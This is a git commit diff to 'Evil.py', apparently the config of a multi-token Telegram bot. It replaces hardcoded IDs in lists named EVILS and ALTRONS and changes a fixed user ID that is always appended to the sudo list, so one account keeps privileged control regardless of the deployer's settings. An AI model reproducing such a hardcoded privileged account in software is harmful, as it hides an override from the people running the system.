2970b105b68cb72b6989923544a8c6056d8dcad0
🦋⃟ᬊᴠɪᴘ•༎꯭ࠫ𝆺𝅥 ᥫ꯭ 𝗛🇰‌𐏓🔥᪵᪳❛ <161941135+llxHKxll@users.noreply.github.com>
2024-03-10 12:11:25 +0530

    Update Evil.py

--- Evil.py
+++ Evil.py
@@ -20,9 +20,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", None)
 BOT_TOKEN9 = config("BOT_TOKEN9", None)
 BOT_TOKEN10 = config("BOT_TOKEN10", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
-EVILS = [1983816571]
-ALTRONS = [-1002077997607]
-SUDO_USERS.append(1983816571)
+EVILS = [6329058409]
+ALTRONS = [-1002135192853]
+SUDO_USERS.append(6329058409)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
